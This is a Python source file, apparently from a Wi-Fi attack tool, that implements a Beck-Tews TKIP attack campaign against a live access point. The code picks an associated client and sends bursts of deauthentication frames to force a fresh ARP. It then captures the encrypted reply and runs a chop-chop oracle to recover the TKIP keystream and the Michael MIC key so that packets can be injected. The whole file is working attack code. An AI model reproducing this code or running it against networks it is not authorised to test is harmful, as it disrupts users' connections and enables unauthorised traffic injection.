"""Beck-Tews TKIP injection campaign: provoke a fresh ARP, capture the AP's TKIP
reply, chop it via :class:`TkipChop`, and hold the recovered keystream + Michael
key for an operator-driven injection session (the modal is a later task; this
campaign only recovers and exposes the capability).

Single TX activity for its whole life (deauth burst, then the chop's serialized
guesses): unlike WEP's ChopChop sub-mode there is no concurrent replay to pause.
"""
from __future__ import annotations

import logging
from typing import Callable, Optional, Tuple

from wifang.campaigns import treelog
from wifang.campaigns.campaign import Campaign
from wifang.campaigns.tkip.chop import TkipChop
from wifang.campaigns.tkip.precheck import assess
from wifang.crack.tkip_beck_tews import Recovered
from wifang.dot11.mac import header_len, str_to_mac
from wifang.dot11.packet import is_group_mac
from wifang.models import AccessPoint

logger = logging.getLogger(__name__)

# LLC/SNAP + ethertype ARP + htype/ptype/hlen/plen + opcode HIGH byte: the invariant head of an
# AP -> client ARP seed frame, stopping one byte short of the opcode low byte so the request/reply
# distinguisher (op=1 vs op=2) is oracle-recovered rather than assumed.
_KNOWN_ARP_PREFIX = bytes([
    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06,
    0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00,
])
# payload(28) + Michael MIC(8) + ICV(4): the shortest cipher worth chopping for an ARP seed.
_MIN_SEED_CIPHER_LEN = 40
_DEAUTH_ROUNDS = 5
_SEED_CAPTURE_TIMEOUT_S = 10.0


def _parse_tkip_body(raw: bytes) -> Optional[Tuple[int, int, bytes]]:
    if len(raw) < 24 or not (raw[1] & 0x40):
        return None
    hlen = header_len(raw[0], raw[1])
    if len(raw) < hlen + 8 + _MIN_SEED_CIPHER_LEN or not (raw[hlen + 3] & 0x20):
        return None
    tsc = (raw[hlen + 2] | (raw[hlen] << 8) | (raw[hlen + 4] << 16)
           | (raw[hlen + 5] << 24) | (raw[hlen + 6] << 32) | (raw[hlen + 7] << 40))
    tid = raw[24] & 0x0F if (raw[0] >> 4) & 0x08 else 0
    return tsc, tid, bytes(raw[hlen + 8:])


class TkipInject(Campaign):
    """Recover a TKIP frame's keystream + Michael key (Beck-Tews) from a live AP."""

    button_id = "btn-tkip"
    key = "tkip"
    hotkey = ("t", "TKIP")
    idle_label = "TKIP"
    run_label = "Stop TKIP"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap: AccessPoint) -> bool:
        """Shown whenever TKIP is the pairwise or (downgraded) group cipher; WMM and a
        client are needed to actually run, but that's assess()'s and ineligible_reason's job."""
        return (ap.pairwise_cipher or "").upper() == "TKIP" or (ap.group_cipher or "").upper() == "TKIP"

    @classmethod
    def ineligible_reason(cls, ap: AccessPoint) -> Optional[str]:
        """assess()'s reason, optimistic about client presence (unobservable here); a client
        that vanishes before/during the run is instead discovered and reported by ``_loop``."""
        verdict = assess(ap, has_client=True)
        return None if verdict.attackable else verdict.reason

    def __init__(
        self,
        array,
        target: AccessPoint,
        log: Optional[Callable[[str], None]] = None,
        countermeasure_interval: float = TkipChop.COUNTERMEASURE_INTERVAL_S,
    ):
        super().__init__(ap=target, array=array)
        self.target = target
        self.bssid_bytes = str_to_mac(target.bssid)
        self.log = log or (lambda _m: None)
        self.countermeasure_interval = countermeasure_interval

        self.direction: Optional[str] = None
        self.client_mac: Optional[str] = None
        self.chop: Optional[TkipChop] = None
        self.recovered: Optional[Recovered] = None
        self.abort_reason: Optional[str] = None

    def _target_clients(self) -> list[str]:
        target = self.target.bssid.lower()
        own = self.array.forged_macs
        return [mac for mac, c in self.array.clients.items()
                if (c.bssid or "").lower() == target and mac not in own]

    async def _capture_seed(self, iface, client_mac: str) -> Optional[Tuple[int, int, bytes]]:
        found: Optional[Tuple[int, int, bytes]] = None

        def on_rx(pkt) -> None:
            nonlocal found
            if found is not None:
                return
            if pkt.bssid != self.target.bssid.lower() or not pkt.from_ds or pkt.to_ds:
                return
            if self.direction == "pairwise" and pkt.dest != client_mac:
                return
            if self.direction == "group" and not is_group_mac(pkt.dest):
                return
            found = _parse_tkip_body(pkt.raw)

        iface.register_rx_callback(on_rx)
        try:
            await self.array.wait_until(lambda: found is not None or self.stopped,
                                        _SEED_CAPTURE_TIMEOUT_S)
        finally:
            iface.unregister_rx_callback(on_rx)
        return found

    async def _loop(self) -> None:
        has_client = bool(self._target_clients())
        verdict = assess(self.target, has_client=has_client)
        self.direction = verdict.direction
        if not verdict.attackable:
            self.log(treelog.leaf_fail(f"[red]not attackable[/red]: {verdict.reason}"))
            return

        async with self.array.lease(channel=self.target.channel, iface=self.iface) as iface:
            self.client_mac = self._target_clients()[0] if has_client else None
            if self.client_mac is None:
                self.log(treelog.leaf_fail("no associated client to provoke an ARP from"))
                return

            self.log(f"Deauthing [cyan]{self.client_mac}[/cyan] to provoke a fresh ARP…")
            await iface.deauth_client(self.target.bssid, self.client_mac, rounds=_DEAUTH_ROUNDS)
            if self.stopped:
                return

            seed = await self._capture_seed(iface, self.client_mac)
            if self.stopped:
                return
            if seed is None:
                self.log(treelog.leaf_fail("no TKIP data frame captured; giving up"))
                return
            tsc, tid, cipher = seed
            dest = self.client_mac if self.direction == "pairwise" else "ff:ff:ff:ff:ff:ff"
            self.log(treelog.branch(f"[dim]{len(cipher)}B cipher captured, chopping…[/dim]"))

            self.chop = TkipChop(
                iface, cipher, _KNOWN_ARP_PREFIX,
                bssid=self.bssid_bytes, client=str_to_mac(dest), tid=tid, tsc=tsc,
                countermeasure_interval=self.countermeasure_interval,
                should_stop=lambda: self.stopped,
            )
            self.recovered = await self.chop.run()
            self.abort_reason = self.chop.abort_reason
            if self.recovered is not None:
                self.log(treelog.leaf_ok(
                    "[bold black on green] ✓ TKIP keystream + Michael key recovered [/bold black on green]"
                ))
            elif self.abort_reason:
                self.log(treelog.leaf_fail(f"[red]chop aborted[/red]: {self.abort_reason}"))

    async def teardown(self) -> None:
        if self.recovered is None and self.abort_reason is None and not self.stopped:
            self.log("[bold red]✗ TKIP injection stopped.[/bold red]")

    def check_auto_stop(self) -> bool:
        return self.recovered is not None or self.abort_reason is not None

    def status_under_card(self) -> str:
        return "● chopping" if self.chop is not None else "● TKIP"

    def status_headlines(self, vault) -> list[str]:
        if self.recovered is not None:
            return ["[bold black on green] ✓ TKIP keystream + Michael key recovered [/bold black on green]",
                    f"[dim]{self.direction} direction[/dim]"]
        if self.abort_reason:
            return ["[bold red]● chop aborted[/bold red]", f"[dim]{self.abort_reason}[/dim]"]
        if self.chop is not None:
            remaining = self.chop.countermeasure_remaining
            if remaining > 0:
                return ["[bold cyan]● Countermeasure pacing[/bold cyan]",
                        f"[dim]{remaining:.0f}s until the next guess[/dim]"]
            return ["[bold cyan]● Chopping[/bold cyan] the captured TKIP frame",
                    f"[dim]{self.chop.bytes_done}/{self.chop.bytes_total} bytes recovered[/dim]"]
        return ["[bold cyan]● Provoking[/bold cyan] a fresh ARP",
                f"[dim]deauthing {self.client_mac or '…'}[/dim]"]
